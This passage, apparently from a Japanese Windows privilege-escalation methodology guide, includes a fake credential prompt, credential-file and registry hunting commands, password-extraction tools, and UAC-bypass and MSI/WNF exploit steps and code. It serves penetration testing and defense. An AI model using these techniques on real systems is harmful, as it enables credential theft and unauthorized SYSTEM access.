$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことがある既知のファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe拡張子なしのファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 データベースでは、`.psafe3` 拡張子が一般的に使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在しても、読み取り、ロック解除、保存された認証情報の利用が可能だとは限りません。こうしたファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと、設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロックを解除するには、実際の master-password と、設定されている key-file やアカウント要素が必要です。許可された調査でエントリ内に LM:NT ハッシュのペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT ハッシュが現在も有効で、対象の NTLM サービスに受け入れられるかを確認してください。vault のエントリだけで Administrator または SYSTEM の権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、および別途必要となるサービス実行の手順もすべて満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報を出力しないでください。

提案されたすべてのファイルを検索します。

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe extensionを使わないSearchコマンドのバリエーション

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

認証情報を探すため、ごみ箱も確認してください。

アクセス可能なごみ箱の項目を確認し、削除されたバックアップや構成アーカイブに加え、名前に認証情報が明記されたファイルも探してください。有用な `.7z`、`.zip`、`.rar` のバックアップは、数か月前のもので、一般的なファイル名が付いている場合もあります。Windows は元のパスと削除日時を `$I` レコードに、削除されたファイルを対になる `$R` エントリに保存します。アーカイブを開く前に、メタデータと現在のアイデンティティによる読み取り権限を確認してください。表示可否はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は確認対象の候補であり、有効なシークレットが含まれている証拠ではありません。

アクセス可能な削除済み `.pfx` は、**コード署名**の手がかりにもなり得ます。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行するには、現在のアイデンティティが対象のスクリプトそのものを変更できること、適用されるルールがスクリプトと対象アカウントに対して変更後の署名を許可すること、さらにスケジュールされたタスクなど、より高い権限で動作するプロセスが実際にそのスクリプトを実行することが必要です。`.pfx` のファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、一連の条件が満たされるとは言えません。秘密鍵の情報を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手がかりを探してください。BitLocker 回復キーのエクスポートは HTML または TXT 形式で保存されている場合があり、名前付きのバックアップアーカイブに含まれていることもあります。こうしたデータを使って、古いバックアップが含まれる別の暗号化データボリュームにアクセスできる場合があります。アクセスが許可されている場合に限り、ボリュームとアーカイブを確認してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、使用可能な回復キーやドメインバックアップが存在するとは言えません。

複数のプログラムに保存された**パスワードを復元**するには、次を使用できます：[http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報が保存されている可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザー履歴

**Chrome または Firefox** のパスワードが保存されている dbs を確認してください。\
**Chrome、Edge、または Firefox** のパスワードが保存されている dbs を確認してください。\
ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

現在のユーザーの標準的な Edge **Default** profile では、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` は親ディレクトリの `User Data` にあります。[Microsoft は既定の profile の場所をドキュメント化しています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別の profile や `UserDataDir` policy によって場所が変わる場合があります。ファイルが存在することは、認証情報ストアの手掛かりにすぎません。読み取り可能なファイルか、該当ユーザーの DPAPI context またはその他の承認済み key material が利用できるか、保存された login がより高い権限を持つアカウントのものかを確認してください。パスだけを列挙する場合、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefox については、[Mozilla のドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、profile の `key4.db` と `logins.json` は、対になる key ファイルと暗号化された login ファイルです。これらの存在は手掛かりにすぎません。両方のファイルが読み取り可能か、保存されたエントリーが存在するか、認証情報を利用可能と判断する前に Primary Password によって key が保護されているかを確認してください。復元した認証情報が domain account のものなら、そのアカウントの実効的なグループ制御権限と、グループの [LAPS password の読み取りまたは復号権限](../active-directory-methodology/laps.md)を別途確認してください。ブラウザーのアーティファクトだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows operating system に組み込まれた技術で、異なる言語で作られた software component 間の**相互通信**を可能にします。各 COM component は **class ID (CLSID)** で**識別され**、各 component は1つ以上の interface を介して機能を公開します。interface は interface ID (IID) で識別されます。

COM class と interface は、それぞれ registry の **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

この registry の CLSID 内には、子 registry **InProcServer32** があります。ここには **DLL** を指す**既定値**と、**Apartment**（Single-Threaded）、**Free**（Multi-Threaded）、**Both**（Single または Multi）、**Neutral**（Thread Neutral）のいずれかを指定できる **ThreadingModel** という値が含まれています。

![ブラウザー履歴 - COM DLL Overwriting: この registry の CLSID 内には、子 registry InProcServer32 があります。ここには DLL を指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行される DLL を**上書き**できれば、その DLL が別のユーザーによって実行される場合に**権限昇格**できる可能性があります。

攻撃者が永続化の手段として COM Hijacking をどのように利用するかについては、こちらを確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルと registry 内の汎用パスワード検索**

**ファイル内容を検索**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名のファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は、私が作成した **msf** plugin です。victim 内の認証情報を検索するすべての metasploit POST module を**自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで説明されているパスワードを含むファイルをすべて自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) も、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEM として実行中のプロセスが、新しいプロセス** (`OpenProcess()`) を**フルアクセスで開く**状況を想像してください。同じプロセスが、**メインプロセスの開いているすべてのハンドルを継承する、低い権限で実行される新しいプロセス** (`CreateProcess()`) **も作成します**。\
その後、**低い権限のプロセスに対するフルアクセス**を取得できれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を注入**できます。\
[この脆弱性を検出して悪用する方法の詳細については、こちらの例を参照してください。](leaked-handle-exploitation.md)\
[異なる権限レベル（フルアクセスに限らない）を持つプロセスやスレッドから継承された、より多くのオープンハンドルをテストして悪用する方法について、詳しくはこちらの別の投稿を参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントを使うと、プロセス間の通信やデータ転送ができます。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にいる場合でも、関係のないプロセス同士でデータを共有できます。これはクライアント／サーバーアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**として定義されます。

**クライアント**がパイプを通じてデータを送信すると、パイプを設定した**サーバー**は、必要な **SeImpersonate** 権限があれば、**クライアントの ID を偽装**できます。偽装可能なパイプを介して通信する**特権プロセス**を特定できれば、そのプロセスが自分の設定したパイプとやり取りした際にその ID を採用し、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)に役立つガイドがあります。

また、以下のツールを使うと、Burp のようなツールで**名前付きパイプの通信を傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、このツールを使うと、**権限昇格の機会を見つけるために、すべてのパイプを一覧表示して確認できます。** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードの Telephony サービス (TapiSrv) は、`\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済みクライアントは、mailslot ベースの非同期イベント処理を悪用し、`ClientAttach` を使って、`NETWORK SERVICE` が書き込み可能な既存の任意のファイルに対する**任意の 4 バイト書き込み**を実行できます。その後、Telephony の管理者権限を取得して、サービスとして任意の DLL を読み込ませることができます。攻撃の全体的な流れは次のとおりです。

- `pszDomainUser` に書き込み可能な既存のパスを指定して `ClientAttach` を実行すると、サービスは `CreateFileW(..., OPEN_EXISTING)` を使ってそのファイルを開き、非同期イベントの書き込み先として使用します。
- 各イベントは、`Initialize` で指定した攻撃者制御の `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) を実行して、`GetAsyncEvents` (`Req_Func 0`) で取得します。その後、登録解除やシャットダウンを行えば、同じ書き込みを確実に繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` を実行できます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行される可能性のあるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** のページを確認してください。

### Markdown レンダラーを介した Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler (`file:`、`ms-appinstaller:`、または登録済みの任意の scheme) を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドライン監視**

ユーザーとして shell を取得したとき、**コマンドラインで認証情報を渡す**スケジュールされたタスクや、その他のプロセスが実行されている場合があります。以下のスクリプトは、2 秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや「NT\AUTHORITY SYSTEM」などの別のプロセスを実行できます。

これにより、同じ脆弱性を使って特権昇格と UAC のバイパスを同時に行えます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名され、発行されています。

影響を受けるシステムには、次のものがあります。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、次の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

この GitHub リポジトリに必要なファイルと情報がすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

UAC と UAC bypasses について学ぶには、こちらを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served Root への Upload Directory Junctions

アプリケーションが予測可能な upload subdirectory を作成し、呼び出し元から渡されたファイル名でそこにファイルを書き込み、その後ファイルを処理することがあります。低権限ユーザーがサーバー側で書き込まれる前にその subdirectory を削除し、NTFS junction に置き換えられる場合、書き込みが junction をたどって web-served directory に到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに配置されたスクリプトは web-service identity で実行される可能性があります。これはアプリケーション固有の arbitrary-write 境界であり、upload directory が書き込み可能であることや、junction がすでに存在することだけでは、この問題の証明にはなりません。

upload handler における正確なパスの構築方法とタイミング、ユーザーが subdirectory を削除・作成する実効権限、宛先の実効 ACL、writer が reparse point をたどるかどうか、web server がその宛先でファイルを実行するかどうかを確認してください。writer と web server のプロセス identity は、それぞれ個別に確認してください。受動的な調査で directory ACL と reparse metadata は確認できますが、handler の動作や将来的な junction の置き換えまでは確認できません。実行が service account として行われる場合は、別の token-privilege の経路を検討する前に、**実際のプロセストークン**を調べてください。

## WNF-triggered privileged scheduled-task cleanup

手動実行を拒否する scheduled task でも、非特権のユーザーが起動できる trigger が存在する場合があります。特権タスクを監査する際は、XML をエクスポートし、task DACL、principal、action に加えて、**すべての** trigger を調べてください。特に、`WnfStateChangeTrigger` は Windows Notification Facility (WNF) の state を指定します。この保護可能な state への更新を現在のユーザーが publish できる場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` であっても、設定された identity で task を間接的に起動できます。<sup>[[43]](#references)</sup>

たとえば、Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task は SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` への更新を受け付けていました。その後、Recall が無効な場合でも `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を調べていました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8バイトの state name に空の更新を送信して、戻りステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例にあるバイト列を使用しています。テスト対象のタスク用にエクスポートされたバイト列に置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを特権による削除に利用する

有用なプリミティブはトリガー単体ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更までの処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択された子項目、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前に検査されたパス名が後で再帰的にたどられることを示す強い兆候です。子孫が信頼できるディレクトリハンドルを基準に開かれ、削除前に検証されていなければ、攻撃者は列挙から使用までの間に解決先を変更できます。<sup>[[43]](#references)</sup>

WNF triggerを、後述する[oplock、junction、Object Manager symlinkの置き換え](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplockによって、正規の子項目を選択した後にcleanerを一時停止させ、その間に書き込み可能な祖先を置き換えます。再開した特権削除処理は、`\RPC Control`を経由して保護対象を解決するようになります。Recall chainでは、これにより、文書化されたMSI rollback techniqueで必要となる`C:\Config.Msi`のSYSTEMによる削除が実現しました。<sup>[[31]](#references)[[43]](#references)</sup>

### ネストされた子孫は浅いreparse point対策を回避する

攻撃者が制御するルートと直下の子項目だけを検証しても、パス名ベースの再帰削除は安全になりません。検査済みのオブジェクトは正規のままにし、junction/oplockの置き換えをその下の追加の子項目に移動します。`IFileOperation::DeleteItem`は最終的に未検証の子孫に到達し、その新しいターゲットをたどります。CVE-2026-20941は、まさにこの種の不完全な修正によって発生しました。最初のRecall patchでは`UKP`とGUID形式のディレクトリは検証されましたが、従来の再帰削除処理が残されていました。<sup>[[43]](#references)</sup>

安全なパターンは、**すべての子孫**を、すでに信頼されているディレクトリハンドルを基準に開き、最終的に解決されたパス／オブジェクトを取得して検証し、その検証済みハンドルに対して削除 disposition を適用することです。プレフィックスを検証した後、パス名ベースの再帰削除に戻ってはいけません。patch reviewでは、実際の呼び出し箇所における構造体も確認してください。このケースでは、`NtCreateFile`で`OBJECT_ATTRIBUTES`を実行時に調べたところ、`RootDirectory`はNULLではなく、相対名は`{GUID}\\secure_file.lock`であることが分かりました。これにより、2つ目の`FILE_DELETE_ON_CLOSE`プリミティブがあるという誤解を招くdecompiler出力は否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダー削除／移動／名前変更からSYSTEM EoPへ

この手法は、exploit codeが[**こちらのブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されており、[**こちらから入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installerのrollback機能を悪用し、アンインストール処理中に正規のファイルを悪意のあるファイルに置き換えます。そのために攻撃者は、`C:\Config.Msi`フォルダーを乗っ取るための**悪意のあるMSI installer**を作成する必要があります。このフォルダーは後にWindows Installerが他のMSI packageのアンインストール中にrollback filesを保存するために使われます。rollback filesは、悪意のあるpayloadを含むように改変されています。

### Windows Installer COMのクリーンアップパスへの注入（CVE-2025-27727）

低権限のクライアントは、`CMsiConfigurationManager` COM object（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を介して、SYSTEMとして動作する`msiexec.exe` serviceにアクセスできます。リバースエンジニアリングにより、関連する`IMsiServer` callsは、vtable offset `0xA0`の`MsiBeginTransactionW`、`0xC8`の`SetEEUIDirectoryAndFilter`、`0x50`の`CleanupTempPackages`と特定されました。これらの名前とoffsetはリバースエンジニアリングによるものであり、buildによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter`は、指定されたパスを`DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT`を指定して開く間だけ、呼び出し元をimpersonateします。これにより、呼び出し元がそのディレクトリを削除できることが確認され、reparse pointをたどることも防がれます。しかし、検査したfile objectが後続のクリーンアップ処理にひも付けられることは保証されず、Windows Installerがそのディレクトリを作成したことも証明されません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW`の後、`SetEEUIDirectoryAndFilter`は、呼び出し元のfilter引数に関係なく、そのパスをフォルダーとして登録します。serviceは`HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`の下に名前付きの`REG_DWORD` valueを書き込みます。value nameは呼び出し元が制御するパスで、dataの`0x00000002`はフォルダーフラグです。続いて`CleanupTempPackages(NULL, FALSE)`がクリーンアップを直接開始します。昇格されたworkerはregistry valuesを列挙し、パスの出所を確認せずにフォルダー項目を再帰的な`FDeleteFolder`に渡します。通常の削除に失敗すると、コードは`LockdownPath`も呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll`から復元された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction redirect ではなく、path reuse です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、後で Windows Installer に同じパス名を、保護された rollback data とともに再作成させます。Cleanup は古い `TempPackages` 名を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、`FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation による想定された境界を回避できます。<sup>[[41]](#references)</sup>

この削除 primitive は、以下の rollback chain に適用できます。別個の `Installer\Folders` record を保持し、保護された `C:\Config.Msi` を削除し、NULL DACL を設定して再作成したうえで、installer が DACL を強化する前に `WRITE_DAC` が付与された handle を保持します。事前に開いた handle で `NtSetSecurityObject` を使って permissive な DACL に戻せば、rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

